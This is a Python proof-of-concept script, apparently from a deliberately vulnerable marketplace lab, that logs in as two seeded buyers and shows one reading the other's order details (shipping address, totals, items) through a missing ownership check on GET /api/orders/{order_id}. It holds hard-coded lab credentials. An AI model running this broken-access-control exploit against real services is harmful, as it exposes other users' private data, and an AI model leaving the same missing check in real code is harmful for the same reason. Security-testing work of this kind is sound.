#!/usr/bin/env python3
"""
BAC-4 — Horizontal BAC: Any User Reads Any Order
Endpoint: GET /api/orders/{order_id}
Auth    : Any authenticated user

The ownership check (buyer/seller/admin) was removed from the order
detail endpoint. Any authenticated user can retrieve full details of
any order by guessing or enumerating sequential order IDs — including
shipping addresses, item details, and financial totals.

Usage
-----
    python poc_008_bola_order_detail.py
"""

import argparse
import sys
import requests

BUYER1_EMAIL    = "charlie@mercury.com"
BUYER1_PASSWORD = "Buyer123!"
BUYER2_EMAIL    = "diana@mercury.com"
BUYER2_PASSWORD = "Buyer123!"
PRODUCT_ID      = 1


def banner():
    print("=" * 60)
    print("  BAC-4 — Horizontal BAC: Any User Reads Any Order")
    print("  Endpoint: GET /api/orders/{order_id}")
    print("=" * 60)


def login(base_url, email, password, label):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {label}"); sys.exit(1)
    print(f"[+] Authenticated as {label}")
    return token


def deposit(base_url, token, amount):
    requests.post(f"{base_url}/api/wallet/deposit",
                  headers={"Authorization": f"Bearer {token}"},
                  json={"amount": amount, "payment_method": "card"}, timeout=10)


def place_order(base_url, token, product_id):
    resp = requests.post(f"{base_url}/api/orders",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"items": [{"product_id": product_id, "quantity": 1}],
                               "shipping_address": "42 Secret Lane, Private City"}, timeout=10)
    resp.raise_for_status()
    data = resp.json()
    print(f"[+] Charlie placed order (id={data['id']}, address='{data['shipping_address']}')")
    return data["id"]


def access_order(base_url, token, order_id, label):
    resp = requests.get(f"{base_url}/api/orders/{order_id}",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    if resp.status_code == 200:
        data = resp.json()
        print(f"[+] {label} accessed order {order_id}!")
        print(f"    buyer_id        : {data['buyer_id']}")
        print(f"    shipping_address: {data['shipping_address']}")
        print(f"    total_amount    : ${data['total_amount']:.2f}")
        print(f"    items           : {[i['product_title'] for i in data['items']]}")
    else:
        print(f"[-] {label} got {resp.status_code}: {resp.json().get('detail')}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--product", type=int, default=PRODUCT_ID)
    args = parser.parse_args()

    banner()
    charlie_token = login(args.url, BUYER1_EMAIL, BUYER1_PASSWORD, "Charlie (buyer1)")
    diana_token   = login(args.url, BUYER2_EMAIL, BUYER2_PASSWORD, "Diana   (buyer2)")
    print()

    deposit(args.url, charlie_token, 500)
    order_id = place_order(args.url, charlie_token, args.product)
    print()

    print(f"[*] Diana now tries to access Charlie's order #{order_id} ...")
    access_order(args.url, diana_token, order_id, "Diana (unrelated buyer)")
    print("\n[+] Done.")


if __name__ == "__main__":
    main()
